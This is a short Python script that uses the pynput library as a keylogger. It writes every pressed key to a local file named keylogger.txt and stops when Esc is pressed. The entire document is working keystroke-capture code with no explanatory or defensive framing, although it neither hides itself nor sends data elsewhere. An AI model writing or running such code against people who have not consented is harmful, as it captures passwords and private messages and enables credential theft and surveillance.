from pynput import keyboard
import time

log_file = open("keylogger.txt", "a")

def on_press(key):
    try:
        log_file.write(f"{key.char} ")
    except AttributeError:
        log_file.write(f"{key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        log_file.write("\n")
        log_file.close()
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
